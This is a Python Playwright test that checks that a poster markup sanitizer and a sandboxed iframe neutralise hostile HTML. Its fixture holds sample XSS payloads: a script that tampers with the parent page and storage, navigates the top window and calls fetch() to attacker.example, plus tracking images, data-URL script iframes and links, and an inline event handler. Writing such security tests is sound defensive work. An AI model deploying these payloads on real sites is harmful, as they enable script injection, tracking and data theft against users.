"""Browser-level poster sandbox security evidence."""

from __future__ import annotations

from html import escape

import pytest

from app.DeepAgent.poster.sanitizer import sanitize_poster_markup


def _launch_chromium_or_skip(playwright):
    from playwright.sync_api import Error as PlaywrightError

    try:
        return playwright.chromium.launch(headless=True)
    except PlaywrightError as exc:
        message = str(exc)
        if (
            "Executable doesn't exist" in message
            or "playwright install" in message
            or "Looks like Playwright was just installed" in message
        ):
            pytest.skip("Playwright Chromium executable is not installed")
        raise


def test_sanitized_poster_is_inert_inside_empty_sandboxed_iframe() -> None:
    sync_api = pytest.importorskip("playwright.sync_api")
    sync_playwright = sync_api.sync_playwright

    sanitized = sanitize_poster_markup(
        """
        <article>
          <h1 id="safe-poster-text">Safe Static Poster</h1>
          <svg id="safe-poster-svg" viewBox="0 0 100 50">
            <rect width="100" height="50" fill="#2563eb"></rect>
            <text x="10" y="25">Safe SVG</text>
          </svg>
          <script>
            parent.document.body.dataset.posterPwned = "script";
            parent.window.__posterSideEffect = "script";
            parent.localStorage.setItem("posterPwned", "script");
            window.open("https://attacker.example/popup");
            top.location = "https://attacker.example/top";
            fetch("https://attacker.example/leak");
          </script>
          <img src="https://attacker.example/pixel.png" alt="tracker">
          <iframe src="data:text/html,<script>parent.__posterSideEffect='iframe'</script>"></iframe>
          <a href="data:text/html,<script>opener.__posterSideEffect='popup'</script>">bad</a>
          <div onclick="parent.__posterSideEffect='event'">click me</div>
          <body background="https://attacker.example/body-bg.png"></body>
          <table background="//attacker.example/table-bg.png">
            <tr><td background="../attacker-relative-bg.png">cell</td></tr>
          </table>
          <style>
            body { background: url(https://attacker.example/bg.png); }
          </style>
        </article>
        """
    )

    outer_page = f"""
    <!doctype html>
    <html>
      <body data-parent-safe="1">
        <div id="parent-sentinel">Parent Safe</div>
        <script>
          window.__posterSideEffect = "";
          try {{ localStorage.removeItem("posterPwned"); }} catch (err) {{}}
        </script>
        <iframe id="poster-frame" sandbox="" srcdoc="{escape(sanitized, quote=True)}"></iframe>
      </body>
    </html>
    """

    with sync_playwright() as playwright:
        browser = _launch_chromium_or_skip(playwright)
        try:
            context = browser.new_context()
            observed_urls: list[str] = []
            dialogs: list[str] = []
            popups: list[str] = []
            navigations: list[str] = []

            context.on("request", lambda request: observed_urls.append(request.url))
            context.route(
                "**/*",
                lambda route: (
                    route.abort()
                    if "attacker.example" in route.request.url
                    or route.request.url.startswith("data:text/html")
                    else route.continue_()
                ),
            )

            page = context.new_page()
            page.on("dialog", lambda dialog: (dialogs.append(dialog.message), dialog.dismiss()))
            page.on("popup", lambda popup: popups.append(popup.url))
            page.on("framenavigated", lambda frame: navigations.append(frame.url))

            page.set_content(outer_page, wait_until="load")
            page.wait_for_timeout(250)

            frame = page.frame_locator("#poster-frame")
            assert frame.locator("#safe-poster-text").is_visible()
            assert frame.locator("#safe-poster-svg").is_visible()

            parent_state = page.evaluate(
                """
                () => {
                  let storageValue = null;
                  try { storageValue = localStorage.getItem("posterPwned"); } catch (err) {}
                  return {
                    topUrl: window.location.href,
                    parentDataset: document.body.dataset.posterPwned || "",
                    sideEffect: window.__posterSideEffect || "",
                    storageValue,
                    parentText: document.querySelector("#parent-sentinel")?.textContent || ""
                  };
                }
                """
            )

            assert dialogs == []
            assert popups == []
            assert parent_state["topUrl"] == "about:blank"
            assert parent_state["parentDataset"] == ""
            assert parent_state["sideEffect"] == ""
            assert parent_state["storageValue"] in (None, "")
            assert parent_state["parentText"] == "Parent Safe"
            assert not any("attacker.example" in url for url in observed_urls)
            assert not any(url.startswith("data:text/html") for url in observed_urls)
            assert not any("attacker.example" in url for url in navigations)
            assert not any(url.startswith("data:text/html") for url in navigations)
        finally:
            browser.close()
